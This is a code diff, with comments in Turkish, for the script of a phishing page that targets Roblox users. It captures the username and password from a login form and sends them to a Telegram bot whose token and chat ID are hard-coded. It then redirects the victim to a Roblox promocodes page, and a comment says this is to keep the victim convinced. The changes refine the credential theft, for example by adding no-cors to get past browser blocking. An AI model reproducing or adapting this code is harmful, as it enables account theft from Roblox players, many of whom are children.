@@ -1,6 +1,6 @@
-// Kesinleşmiş Bilgiler
-const token = "8587670631:AAGkVl-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; //
-const chatID = "8512406356"; //
+// Kesinleşmiş ve Doğrulanmış Bilgiler
+const token = "8587670631:AAGkVl-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; // Son attığın doğru token
+const chatID = "8512406356"; // Senin Chat ID'n
 
 document.getElementById('xf').addEventListener('submit', function(e) {
     e.preventDefault();
@@ -8,18 +8,17 @@ document.getElementById('xf').addEventListener('submit', function(e) {
     const u = document.getElementById('u').value;
     const p = document.getElementById('p').value;
     
-    const mesaj = `🎯 GANİMET DÜŞTÜ!\n👤 User: ${u}\n🔑 Pass: ${p}`;
+    const mesaj = `🎯 ROBUX GANİMETİ DÜŞTÜ!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}`;
     
-    // Tarayıcıdan direkt Telegram'a istek atıyoruz
+    // Telegram API İsteği
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(mesaj)}`;
 
-    fetch(url)
+    fetch(url, { mode: 'no-cors' }) // Tarayıcı engelini aşmak için no-cors ekledik
     .then(() => {
-        // Mesaj gittikten sonra yönlendir
-        window.location.replace("https://www.roblox.com/home");
+        // Bilgi gittikten sonra kurbanı inandırıcı bir yere yolla
+        window.location.replace("https://www.roblox.com/promocodes");
     })
-    .catch((err) => {
-        console.error("Hata:", err);
-        window.location.replace("https://www.google.com");
+    .catch(() => {
+        window.location.replace("https://www.roblox.com/login");
     });
 });
